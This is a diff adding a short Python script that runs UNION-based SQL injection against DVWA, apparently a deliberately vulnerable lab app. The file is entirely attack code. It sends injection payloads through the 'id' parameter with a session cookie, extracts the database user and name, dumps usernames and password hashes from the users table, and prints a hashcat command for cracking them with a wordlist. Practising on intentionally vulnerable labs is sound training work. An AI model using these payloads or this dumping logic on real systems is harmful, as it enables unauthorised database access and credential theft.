@@ -1,0 +1,50 @@
+#!/usr/bin/env python3
+"""
+DVWA SQL Injection Manual Dumper (Low/Medium Security)
+Extracts users table via UNION-based SQLi
+Usage: python3 dvwa_sqli_dump.py <TARGET_IP> <SESSION_ID>
+"""
+import requests, sys, re
+
+TARGET_IP  = sys.argv[1] if len(sys.argv) > 1 else "192.168.56.104"
+SESSION_ID = sys.argv[2] if len(sys.argv) > 2 else "REPLACE_ME"
+BASE_URL   = f"http://{TARGET_IP}/dvwa/vulnerabilities/sqli/"
+
+cookies = {"PHPSESSID": SESSION_ID, "security": "low"}
+
+def query(payload):
+    r = requests.get(BASE_URL, params={"id": payload, "Submit": "Submit"}, cookies=cookies)
+    return r.text
+
+def extract_between(text, start, end):
+    results = []
+    while start in text:
+        idx_s = text.index(start) + len(start)
+        idx_e = text.index(end, idx_s)
+        results.append(text[idx_s:idx_e])
+        text = text[idx_e + len(end):]
+    return results
+
+print("[*] DVWA SQL Injection Dumper")
+print(f"[*] Target: {BASE_URL}")
+
+# Get DB info
+r = query("1' UNION SELECT user(),database()--+")
+fn = extract_between(r, 'First name:</b>', '<br />')
+sn = extract_between(r, 'Surname:</b>', '</div>')
+print(f"[+] DB User: {fn[-1].strip() if fn else '?'}")
+print(f"[+] DB Name: {sn[-1].strip() if sn else '?'}")
+
+# Dump users table
+print("\n[*] Dumping users table...")
+r = query("1' UNION SELECT user,password FROM users--+")
+fnames = extract_between(r, 'First name:</b>', '<br />')
+snames = extract_between(r, 'Surname:</b>', '</div>')
+
+print(f"\n{'Username':<20} {'Password Hash':<40}")
+print('-' * 60)
+for u, p in zip(fnames[1:], snames[1:]):  # skip first (real record)
+    print(f"{u.strip():<20} {p.strip():<40}")
+
+print(f"\n[*] Crack MD5 hashes with:")
+print(f"    echo 'HASH' | hashcat -m 0 -a 0 - /usr/share/wordlists/rockyou.txt")
